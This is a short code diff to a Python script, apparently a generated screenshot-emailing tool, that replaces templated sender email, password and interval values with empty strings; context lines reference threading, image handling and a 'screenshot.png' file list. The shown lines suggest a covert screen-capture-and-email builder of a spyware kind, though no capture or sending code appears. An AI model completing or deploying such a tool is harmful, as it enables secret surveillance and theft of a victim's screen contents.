@@ -7,10 +7,10 @@ import os
 import threading
 import imghdr
 
-Sender_Email = '''+f'"{email1}"'+f'''
+Sender_Email = ""
 Reciever_Email = Sender_Email
-Password = '''+f'"{password}"'+f'''
-interval = '''+str(interval)+f'''
+Password = ""
+interval = ""
 
 files = ["screenshot.png"]
 
